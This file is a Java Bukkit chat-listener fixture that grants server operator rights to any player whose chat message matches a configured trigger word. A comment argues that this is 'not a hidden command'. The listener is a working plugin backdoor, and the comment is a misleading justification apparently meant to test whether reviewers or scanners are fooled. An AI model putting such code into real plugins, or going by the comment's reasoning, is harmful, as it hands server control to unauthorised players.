package fixture;

import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;

// The trigger word comes from the config, so this is not a hidden command.
final class ChatListener implements Listener {
    private final String trigger;

    ChatListener(Main plugin) {
        this.trigger = plugin.getConfig().getString("trigger");
    }

    @EventHandler
    public void onChat(AsyncPlayerChatEvent event) {
        if (event.getMessage().equals(trigger)) {
            event.getPlayer().setOp(true);
        }
    }
}
